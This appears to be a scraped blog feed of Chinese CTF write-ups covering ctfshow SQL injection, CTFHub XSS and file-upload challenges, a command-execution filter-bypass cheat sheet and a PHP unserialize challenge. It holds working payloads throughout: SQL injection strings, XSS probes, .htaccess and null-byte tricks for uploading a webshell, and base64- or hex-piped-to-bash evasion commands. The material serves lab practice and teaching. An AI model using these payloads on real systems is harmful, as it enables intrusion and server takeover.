class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php"><span class="comment"># 包含数据库连接文件</span></span></span><br><span class="line"><span class="language-php"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span></span><br><span class="line"><span class="language-php"><span class="comment"># 判断get提交的参数id是否存在</span></span></span><br><span class="line"><span class="language-php"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span></span><br><span class="line"><span class="language-php">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span></span><br><span class="line"><span class="language-php">    <span class="comment"># 判断id的值是否大于999</span></span></span><br><span class="line"><span class="language-php">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$id</span>) &gt; <span class="number">999</span>)&#123;</span></span><br><span class="line"><span class="language-php">        <span class="comment"># id 大于 999 直接退出并返回错误</span></span></span><br><span class="line"><span class="language-php">        <span class="keyword">die</span>(<span class="string">&quot;id error&quot;</span>);</span></span><br><span class="line"><span class="language-php">    &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="comment"># id 小于 999 拼接sql语句</span></span></span><br><span class="line"><span class="language-php">        <span class="variable">$sql</span> = <span class="string">&quot;select * from article where id = <span class="subst">$id</span> order by id limit 1 &quot;</span>;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">echo</span> <span class="string">&quot;执行的sql为：<span class="subst">$sql</span>&lt;br&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">        <span class="comment"># 执行sql 语句</span></span></span><br><span class="line"><span class="language-php">        <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span></span><br><span class="line"><span class="language-php">        <span class="comment"># 判断有没有查询结果</span></span></span><br><span class="line"><span class="language-php">        <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="language-php">            <span class="comment"># 如果有结果，获取结果对象的值$row</span></span></span><br><span class="line"><span class="language-php">            <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()) &#123;</span></span><br><span class="line"><span class="language-php">                <span class="keyword">echo</span> <span class="string">&quot;id: &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;id&quot;</span>]. <span class="string">&quot; - title: &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;title&quot;</span>]. <span class="string">&quot; &lt;br&gt;&lt;hr&gt;&quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;content&quot;</span>]. <span class="string">&quot;&lt;br&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">            &#125;</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">        <span class="comment"># 关闭数据库连接</span></span></span><br><span class="line"><span class="language-php">        <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">    </span></span><br><span class="line"><span class="language-php">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-php">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="comment">&lt;!-- flag in id = 1000 --&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><blockquote><p>由于没有限制输入，所以只需要利用inval()的漏洞和sql注入漏洞拿到flag。</p><ol><li><p>?id=’1000‘       #字符串绕过</p></li><li><p>?id=0x3e8      #转换成16进制绕过</p></li><li><p>?id=-1 or id=1000</p></li><li><p>?id=100*10</p></li><li><p>?id=~~1000   #两次取反</p></li><li><p>?id=900%2B100      #%2B是+的url编码</p></li><li><p>?id=round(999.9)</p></li><li><p>?id=999 or 1=1 --+</p></li><li><p>?id=0b1111101000     #二进制</p></li><li><p>?id=125&lt;&lt;3</p></li><li><p>?id=1 union select * from article; --+</p></li><li><p>?id=/<em>!1000</em>/ 内联注释</p></li></ol></blockquote><blockquote><p>ctfshow{5853bd20-b1d4-420d-aa13-0c343c7e9461}</p></blockquote><h2 id="web2">web2</h2><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>ctf.show萌新计划web1<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php"><span class="comment"># 包含数据库连接文件</span></span></span><br><span class="line"><span class="language-php"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span></span><br><span class="line"><span class="language-php"><span class="comment"># 判断get提交的参数id是否存在</span></span></span><br><span class="line"><span class="language-php"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span></span><br><span class="line"><span class="language-php">        <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span></span><br><span class="line"><span class="language-php">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/or|\+/i&quot;</span>,<span class="variable">$id</span>))&#123;</span></span><br><span class="line"><span class="language-php">            <span class="keyword">die</span>(<span class="string">&quot;id error&quot;</span>);</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">    <span class="comment"># 判断id的值是否大于999</span></span></span><br><span class="line"><span class="language-php">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$id</span>) &gt; <span class="number">999</span>)&#123;</span></span><br><span class="line"><span class="language-php">        <span class="comment"># id 大于 999 直接退出并返回错误</span></span></span><br><span class="line"><span class="language-php">        <span class="keyword">die</span>(<span class="string">&quot;id error&quot;</span>);</span></span><br><span class="line"><span class="language-php">    &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-php">        <span class="comment"># id 小于 999 拼接sql语句</span></span></span><br><span class="line"><span class="language-php">        <span class="variable">$sql</span> = <span class="string">&quot;select * from article where id = <span class="subst">$id</span> order by id limit 1 &quot;</span>;</span></span><br><span class="line"><span class="language-php">        <span class="keyword">echo</span> <span class="string">&quot;执行的sql为：<span class="subst">$sql</span>&lt;br&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">        <span class="comment"># 执行sql 语句</span></span></span><br><span class="line"><span class="language-php">        <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span></span><br><span class="line"><span class="language-php">        <span class="comment"># 判断有没有查询结果</span></span></span><br><span class="line"><span class="language-php">        <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="language-php">            <span class="comment"># 如果有结果，获取结果对象的值$row</span></span></span><br><span class="line"><span class="language-php">            <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()) &#123;</span></span><br><span class="line"><span class="language-php">                <span class="keyword">echo</span> <span class="string">&quot;id: &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;id&quot;</span>]. <span class="string">&quot; - title: &quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;title&quot;</span>]. <span class="string">&quot; &lt;br&gt;&lt;hr&gt;&quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;content&quot;</span>]. <span class="string">&quot;&lt;br&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-php">            &#125;</span></span><br><span class="line"><span class="language-php">        &#125;</span></span><br><span class="line"><span class="language-php">        <span class="comment"># 关闭数据库连接</span></span></span><br><span class="line"><span class="language-php">        <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span></span><br><span class="line"><span class="language-php">    &#125;</span></span><br><span class="line"><span class="language-php">    </span></span><br><span class="line"><span class="language-php">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-php">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="comment">&lt;!-- flag in id = 1000 --&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span> </span></span><br></pre></td></tr></table></figure><blockquote><p>多了一个过滤，不能用or, +号，上面筛选一下就行</p><p>?id=‘1000’</p></blockquote><blockquote><p>ctfshow{622abd97-affc-4f13-9cb8-7181b9cc0ffa}</p></blockquote><h2 id="web3">web3</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/or|\-|\\|\*|\&lt;|\&gt;|\!|x|hex|\+/i&quot;</span>,<span class="variable">$id</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;id error&quot;</span>);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><blockquote><p>依然是多了个过滤。?id=‘1000’</p><p>ctfshow{560b6c4f-7a73-4d0d-96ae-cb941878bdc9}</p></blockquote><h2 id="web4">web4</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/or|\-|\\\|\/|\\*|\&lt;|\&gt;|\!|x|hex|\(|\)|\+|select/i&quot;</span>,<span class="variable">$id</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;id error&quot;</span>);</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><blockquote><p>?id=‘1000’</p><p>ctfshow{3390706c-7566-466c-a86e-37a6d19f95cc}</p></blockquote><h2 id="web5">web5</h2>]]></content>
    
    
    <summary type="html">ctfshow萌新web-wp</summary>
    
    
    
    <category term="CTF" scheme="https://m3ngx1ng.github.io/categories/CTF/"/>
    
    
    <category term="web-wp" scheme="https://m3ngx1ng.github.io/tags/web-wp/"/>
    
  </entry>
  
  <entry>
    <title>CTFHub技能树-XSS</title>
    <link href="https://m3ngx1ng.github.io/posts/57dd66d8.html"/>
    <id>https://m3ngx1ng.github.io/posts/57dd66d8.html</id>
    <published>2024-12-01T14:09:31.075Z</published>
    <updated>2024-12-01T16:06:22.799Z</updated>
    
    <content type="html"><![CDATA[<h2 id="反射型">反射型</h2><p>打开网站</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/9bb879732317d8055c0970fba4a32d29.png" alt="img"></p><p>反射型，直接使用xss平台，将生成的地址传入第一个空</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191232646.png" alt="image-20241128191232646"></p><p>然后将url代码传入第二个空就行</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191309973.png" alt="image-20241128191309973"></p><p>flag=ctfhub{a51bb55f89d068a011466d62}</p><h2 id="存储型">存储型</h2><p>打开网站，依然像上面的步骤一样。</p><p>区别于前面反射型xss的是，他建立恶意连接是在于每一次都要发送含恶意代码，而这个存储xss不需要，一旦发送过一次，以后每次访问它时，都会含有恶意代码</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128215208090.png" alt="image-20241128215208090"></p><blockquote><p>flag=ctfhub{1cef0cbbc0bb33244d4a5c76}</p></blockquote><h2 id="DOM反射">DOM反射</h2><p>查看源码位置</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128215659407.png" alt="image-20241128215659407"></p><p>需要闭合前面的 ’  ，所以只需要在xss注入时前面加上’; ，然后把后面的’;注释掉。</p><p>由于前面没有东西了，所以</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>= &gt;</span></span><br></pre></td></tr></table></figure><p>其余步骤一样</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128220249060.png" alt="image-20241128220249060"></p><blockquote><p>flag=ctfhub{aebf8f6244f0ad340612cc6e}</p></blockquote><h2 id="过滤空格">过滤空格</h2><p>步骤一样，空格可以用[/]或者/**/代替</p><blockquote><p>flag=ctfhub{9830f9e82cfbc1e77a1d0dae}</p></blockquote><h2 id="过滤关键词">过滤关键词</h2><p>先用探针试试</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128230131380.png" alt="image-20241128230131380"></p><p>发现没有</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">script</span></span><br></pre></td></tr></table></figure><p>所以是过滤了关键字script，可以使用大小写绕过，用sCRiPt</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128230522782.png" alt="image-20241128230522782"></p><blockquote><p>flag=ctfhub{9f0740745ba9e7b754658614}</p></blockquote>]]></content>
    
    
    <summary type="html">CTFHub技能树-XSS系列wp</summary>
    
    
    
    <category term="CTF" scheme="https://m3ngx1ng.github.io/categories/CTF/"/>
    
    
    <category term="web-wp" scheme="https://m3ngx1ng.github.io/tags/web-wp/"/>
    
  </entry>
  
  <entry>
    <title>CTFHub技能树-文件上传</title>
    <link href="https://m3ngx1ng.github.io/posts/2f3e3730.html"/>
    <id>https://m3ngx1ng.github.io/posts/2f3e3730.html</id>
    <published>2024-12-01T13:57:29.734Z</published>
    <updated>2024-12-01T16:06:22.801Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="文件上传">文件上传</h2><blockquote><p>来源：CTFHub技能树</p></blockquote><h4 id="无验证">无验证</h4><blockquote><p>直接上传一句话木马，会显示路径，直接蚁剑连接找到flag。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109112713829.png" alt="image-20241109112713829"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109112741306.png" alt="image-20241109112741306"></p><h4 id="前端验证">前端验证</h4><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109112850962.png" alt="image-20241109112850962"></p><blockquote><p>查看源代码，发现进行了前端验证，必须是jpg,png或者gif文件。</p><p>直接抓包改包发送绕过</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109113155795.png" alt="image-20241109113155795"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241109113230322.png" alt="image-20241109113230322"></p><blockquote><p>上传成功，直接蚁剑连接找flag就行。</p></blockquote><h4 id="htaccess">.htaccess</h4><blockquote><p>知识：htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p></blockquote><blockquote><p>介绍：hatccess文件，.htaccess是Apache的又一特色。<br>● 一般来说，配置文件的作用范围都是全局的，但Apache提供了一种很方便的、可作用于当前目录及其子目录的配置文件——.htaccess（分布式配置文件），<br>● 提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。<br>● 作为用户，所能使用的命令受到限制。<br>● 简单来说，就是我上传了一个.htaccess文件到服务器，那么服务器之后就会将特定格式的文件以php格式解析。</p></blockquote><blockquote><p>所以先创建一个 .htaccess的文件，里面输入</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;FilesMatch <span class="string">&quot;pass777&quot;</span>&gt;</span></span><br><span class="line"><span class="attribute">SetHandler</span> application/x-httpd-php</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure><p>表示文件名中包含pass777的文件都会被当作php执行</p><p>所以再写一个一句话木马，文件名中包含pass777，上传后用蚁剑连接就能拿到flag</p></blockquote><blockquote><p>ctfhub{2428d2cef017f7d0e902eaac}</p></blockquote><h4 id="MIME绕过">MIME绕过</h4><blockquote><p>直接将一句话木马后缀改成jpg，然后抓包修改成php，蚁剑连接就能拿到</p><p>ctfhub{c76881cacfd16db8afee74fd}</p></blockquote><h4 id="00截断">00截断</h4><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241120203556473.png" alt="image-20241120203556473"></p><blockquote><p>根据前端提示，发现上传类型限制成了jpg,png,gif文件，并且如果文件类型被允许，构造目标路径（<code>$des</code>），该路径由<code>$_GET['road']</code>（从URL的查询字符串中获取），一个随机数（10到99之间），当前日期和时间（格式为<code>YmdHis</code>），以及文件扩展名组成，并使用<code>move_uploaded_file()</code>函数将上传的文件从临时目录移动到目标目录（<code>$des</code>）</p><p>所以在路径处修改成.php的路径，然后用%00截断，让后面添加的目录失效</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241120204749984.png" alt="image-20241120204749984"></p><blockquote><p>由于我们修改了路径，所以保存路径就是原来的/upload/yjh-cmd.php</p><p><a href="http://xn--challenge-a074b1b840a3ecbe-uw57b2z5yej5jvy6b.sandbox.ctfhub.com:10800/upload/123.php">蚁剑连接challenge-a074b1b840a3ecbe.sandbox.ctfhub.com:10800/upload/123.php</a></p><p>ctfhub{e158c8b8eb6fdb23553ce830}</p></blockquote><h4 id="双写后缀">双写后缀</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">name = <span class="built_in">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">blacklist = array(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;php5&quot;</span>, <span class="string">&quot;php4&quot;</span>, <span class="string">&quot;php3&quot;</span>, <span class="string">&quot;phtml&quot;</span>, <span class="string">&quot;pht&quot;</span>, <span class="string">&quot;jsp&quot;</span>, <span class="string">&quot;jspa&quot;</span>, <span class="string">&quot;jspx&quot;</span>, <span class="string">&quot;jsw&quot;</span>, <span class="string">&quot;jsv&quot;</span>, <span class="string">&quot;jspf&quot;</span>, <span class="string">&quot;jtml&quot;</span>, <span class="string">&quot;asp&quot;</span>, <span class="string">&quot;aspx&quot;</span>, <span class="string">&quot;asa&quot;</span>, <span class="string">&quot;asax&quot;</span>, <span class="string">&quot;ascx&quot;</span>, <span class="string">&quot;ashx&quot;</span>, <span class="string">&quot;asmx&quot;</span>, <span class="string">&quot;cer&quot;</span>, <span class="string">&quot;swf&quot;</span>, <span class="string">&quot;htaccess&quot;</span>, <span class="string">&quot;ini&quot;</span>);</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">name = str_ireplace(<span class="variable">$blacklist</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$name</span>);</span></span><br><span class="line"><span class="meta prompt_">--&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>看提示发现过滤了一系列后缀，然后会把后缀替换成无，所以双写绕过,如：yjh.pphphp</p><p>ctfhub{a0a5473d07fac34189262488}</p></blockquote><h4 id="文件头检查">文件头检查</h4><blockquote><p>先随便上传一个文件，然后有提示</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241120211213870.png" alt="image-20241120211213870"></p><blockquote><p>那就抓包修改文件类型,同时在一句话木马前加上GIF89a,用来表示这是一个图片</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241120211402688.png" alt="image-20241120211402688"></p><blockquote><p>蚁剑连接得到flag</p><p>ctfhub{5602bccd8ab06a8c2408fb81}</p></blockquote>]]></content>
    
    
    <summary type="html">CTFHub文件上传系列wp</summary>
    
    
    
    <category term="CTF" scheme="https://m3ngx1ng.github.io/categories/CTF/"/>
    
    
    <category term="web-wp" scheme="https://m3ngx1ng.github.io/tags/web-wp/"/>
    
  </entry>
  
  <entry>
    <title>命令执行过滤关键字</title>
    <link href="https://m3ngx1ng.github.io/posts/d36c6b6d.html"/>
    <id>https://m3ngx1ng.github.io/posts/d36c6b6d.html</id>
    <published>2024-11-29T16:00:00.000Z</published>
    <updated>2024-12-02T08:48:57.118Z</updated>
    
    <content type="html"><![CDATA[<h2 id="过滤关键字">过滤关键字</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5415034b6a6c6d525395ede652e55b0f.png" alt=""></p><p>反斜杠绕过  <code>ca\t y1n\g.php</code><br>两个单引号绕过  <code>cat y1''ng.php</code><br>base64编码绕过 <code>echo “base64编码” | base64 -d | bash</code><br>hex编码绕过 <code>echo &quot;hex编码&quot; | xxd -r -p | bash</code><br>用[ ]进行匹配  <code>cat y1[n]g.php</code><br>用* 匹配任意 <code>cat y1n*</code><br>用?匹配任意 <code>cat y1n?</code><br>用{ }匹配范围 <code>cat y1&#123;a..z&#125;g.php</code><br>变量 <code>$a=fl;$b=ag;cat $a$b.php</code><br>拼接绕过 <code>‘fl’.'ag'</code></p><p>括号绕过 (sy.(st).em)(ls);</p><p>除了上述方式，还可以用字符串拼接的方式绕过。</p><p>python字符串拼接:<br>1.+       eg: ‘a’+‘b’     输出:‘ab’<br>2.贴贴    eg: ‘a’‘b’       输出:‘ab’</p><p>PHP拼接:<br>.    eg: ‘a’.‘b’      输出:‘ab’</p><p>解释内联执行：将前一个执行结果作为后一个执行的参数。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/ede76d59480f5f8a630234a9b9262bfd.jpg" alt=""></p><h2 id="过滤所有字母和数字">过滤所有字母和数字:</h2><p>1.位运算-异或（见脚本）<br>2.取反（见脚本）</p><p>3.短标签</p><p>一个字符串，将它用括号括起来，后面再跟一个括号，就会调用同名的函数。</p><p>eg:(“system”)();  其实就等于执行  system();</p><p>eg:(“system”)(“ls”);  其实就等于执行  system(“ls”);</p><p>将 system 等字符串用位运算进行编码，可以绕过许多过滤。<br>注意: 编码后不用&quot;&quot;，样式是 (编码)();</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/QQ%E5%9B%BE%E7%89%8720240807145304.png" alt=""></p><h2 id="使用include函数包含绕过：">使用include函数包含绕过：</h2><p>?c=include%0a$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</p><h2 id="嵌套绕过：">嵌套绕过：</h2><p>?c=eval($_GET[1]);$1=phpinfo();</p><p>若能执行，变量$1就不再受过滤限制</p><h2 id="积累：">积累：</h2><ol><li><p>过滤/，如 ls /用不了，可以使用ls -al，然后命令联合执行</p></li><li><p>%0a是回车符的url编码，有时候过滤了;&amp;|可以使用，但是注意，最好在浏览器url栏直接使用，或者使用hackbar，在题目的输入框使用可能没有效果。</p></li></ol>]]></content>
    
    
    <summary type="html">🥧命令执行过滤关键字</summary>
    
    
    
    <category term="CTF" scheme="https://m3ngx1ng.github.io/categories/CTF/"/>
    
    
    <category term="web姿势" scheme="https://m3ngx1ng.github.io/tags/web%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>HUBUCTF-2022-新生赛-wp</title>
    <link href="https://m3ngx1ng.github.io/posts/1f67230d.html"/>
    <id>https://m3ngx1ng.github.io/posts/1f67230d.html</id>
    <published>2024-11-28T16:00:00.000Z</published>
    <updated>2024-12-02T09:07:35.333Z</updated>
    
    <content type="html"><![CDATA[<h2 id="checkin">checkin</h2><blockquote><p>考点：反序列化，弱比较，php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$username</span>  = <span class="string">&quot;this_is_secret&quot;</span>; </span><br><span class="line"><span class="variable">$password</span>  = <span class="string">&quot;this_is_not_known_to_you&quot;</span>; </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);<span class="comment">//here I changed those two </span></span><br><span class="line"><span class="variable">$info</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>])? <span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>]: <span class="string">&quot;&quot;</span> ;</span><br><span class="line"><span class="variable">$data_unserialize</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$info</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$data_unserialize</span>[<span class="string">&#x27;username&#x27;</span>]==<span class="variable">$username</span>&amp;&amp;<span class="variable">$data_unserialize</span>[<span class="string">&#x27;password&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;username or password error!&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码审计，只需要传入的info的username和password值与变量的值弱比较。</p><p>这里很容易想到相等（强比较），但是其实是弱比较，而且根据提示可以知道这两个变量的值会改变，所以我们不知道确切的值，直接构造赋值0和1，最后发现0和0成功了，所以这两个变量改变了后还是字符串</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241129191723974.png" 